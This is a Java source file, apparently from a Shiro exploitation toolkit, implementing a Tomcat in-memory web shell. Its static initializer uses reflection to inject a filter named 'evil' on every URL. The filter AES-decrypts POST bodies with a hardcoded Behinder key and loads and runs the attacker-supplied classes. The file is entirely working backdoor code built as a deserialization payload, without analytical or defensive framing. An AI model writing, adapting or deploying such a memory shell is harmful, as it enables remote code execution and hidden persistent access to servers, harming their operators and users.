package com.y5neko.shiroexp.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Field;
import org.apache.catalina.core.StandardContext;
import java.lang.reflect.InvocationTargetException;
import java.io.IOException;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import java.lang.reflect.Constructor;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;
import javax.servlet.*;
import java.lang.reflect.Method;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;


public class GrateMemshell extends AbstractTranslet implements Filter {
    static {
        try {
            final String name = "evil";
            final String URLPattern = "/*";

            WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Class<? extends StandardContext> aClass = null;
            try{
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                aClass.getDeclaredField("filterConfigs");
            }catch (Exception e){
                aClass = (Class<? extends StandardContext>) standardContext.getClass();
                aClass.getDeclaredField("filterConfigs");
            }
            Field Configs = aClass.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            BehinderFilter behinderFilter = new BehinderFilter();

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(behinderFilter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(behinderFilter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(URLPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(name, filterConfig);
        } catch (NoSuchFieldException ex) {
            ex.printStackTrace();
        } catch (InvocationTargetException ex) {
            ex.printStackTrace();
        } catch (IllegalAccessException ex) {
            ex.printStackTrace();
        } catch (NoSuchMethodException ex) {
            ex.printStackTrace();
        } catch (InstantiationException ex) {
            ex.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            System.out.println("Do Filter ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request",request);
            pageContext.put("response",response);
            pageContext.put("session",session);

            if (request.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                //revision BehinderFilter
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("doFilter");
    }

    @Override
    public void destroy() {

    }

}